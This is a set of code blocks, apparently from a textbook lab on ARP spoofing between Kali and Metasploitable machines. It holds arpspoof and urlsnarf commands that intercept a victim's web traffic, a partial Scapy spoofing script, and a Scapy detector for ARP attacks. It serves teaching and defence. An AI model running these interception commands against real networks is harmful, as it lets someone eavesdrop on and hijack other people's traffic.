["```\nkali@kali:~$ sudo -i\nkali@kali:~$ apt-get update\nkali@kali:~$ apt-get install dsniff\n```", "```\nkali@kali:~$ sudo netdiscover\n```", "```\nIP                At MAC Address     Count     Len  MAC Vendor / Hostname\n\n-----------------------------------------------------------------------------\n\n192.168.100.1     08:00:27:3b:8f:ed      1      60  PCS Systemtechnik GmbH\n\n192.168.100.101   08:00:27:fe:31:e6      1      60  PCS Systemtechnik GmbH\n```", "```\nkali@kali:~$ echo 1 > /proc/sys/net/ipv4/ip_forward\n```", "```\narpspoof -i eth0 -t <VICTIM_IP> <ROUTER_IP>\n```", "```\nkali@kali:~$ sudo arpspoof -i eth0 -t 192.168.100.101 192.168.100.1\n\n[sudo] password for kali:\n\n8:0:27:1f:30:76 8:0:27:fe:31:e6 0806 42: arp reply 192.168.100.1 is-at 8:0:27:1f:30:76 ➊\n\n8:0:27:1f:30:76 8:0:27:fe:31:e6 0806 42: arp reply 192.168.100.1 is-at 8:0:27:1f:30:76\n```", "```\nkali@kali:~$ arpspoof -i eth0 -t <ROUTER_IP> <VICTIM_IP>\n```", "```\nkali@kali:~$ urlsnarf -i eth0\n```", "```\nmsfadmin@metasploitable:~$ wget http://www.google.com\n```", "```\nkali@kali:~$ sudo urlsnarf -i eth0\nurlsnarf: listening on eth0 [tcp port 80 or port 8080 or port 3128]\n\n192.168.100.101 - - \"GET http://www.google.com/ HTTP/1.0\"\n\n```", "```\nkali@kali:~$ sudo apt-get install python3-pip\nkali@kali:~$ pip3 install --pre scapy[basic]\n```", "```\nfrom scapy.all import sniff\nIP_MAC_Map = {}\n\ndef processPacket(packet):\n\n    src_IP = packet['ARP'].psrc\n\n    src_MAC = packet['Ether'].src\n\n    if src_MAC in IP_MAC_Map.keys():\n\n        if IP_MAC_Map[src_MAC] != src_IP :\n\n            try:\n\n                old_IP =  IP_MAC_Map[src_MAC]\n\n            except:\n\n                old_IP = \"unknown\"\n\n            message = (\"\\n Possible ARP attack detected \\n \"\n\n                        + \"It is possible that the machine with IP address \\n \"\n\n                        + str(old_IP) + \" is pretending to be \" + str(src_IP)\n\n                         +\"\\n \")\n\n            return message\n    else:\n\n        IP_MAC_Map[src_MAC] = src_IP\n\n➊ sniff(count=0, filter=\"arp\", store = 0, prn = processPacket)\n```", "```\nkali@kali:~$ sudo python3 arpDetector.py\n```", "```\nPossible ARP attack detected\nIt is possible that the machine with IP address\n\n192.168.0.67 is pretending to be 192.168.48.67\n```", "```\nmsfadmin@metasploitable:~$ sudo arp -a\n```", "```\nkali@kali:~$ sudo python3 arpSpoof.py <VICTIM_IP>  <ROUTER_IP>\n```", "```\n   from scapy.all import *\n\n   import sys\n\n➊ def arp_spoof(dest_ip, dest_mac, source_ip):\n\n       pass\n\n➋ def arp_restore(dest_ip, dest_mac, source_ip, source_mac):\n\n       packet= ➌ ARP(op=\"is-at\", hwsrc=source_mac,\n\n                       psrc= source_ip, hwdst= dest_mac, pdst= dest_ip)\n\n     ➍ send(packet, verbose=False)\n\n    def main():\n\n        victim_ip= sys.argv[1]\n\n        router_ip= sys.argv[2]\n\n        victim_mac = getmacbyip(victim_ip)\n\n        router_mac = getmacbyip(router_ip)\n\n        try:\n\n           print(\"Sending spoofed ARP packets\")\n\n           while True:\n\n              arp_spoof(victim_ip, victim_mac, router_ip)\n\n              arp_spoof(router_ip, router_mac, victim_ip)\n\n        except KeyboardInterrupt:\n\n           print(\"Restoring ARP Tables\")\n\n           arp_restore(router_ip, router_mac, victim_ip, victim_mac)\n\n           arp_restore(victim_ip, victim_mac, router_ip, router_mac)\n\n           quit()\n\n    main()\n```"]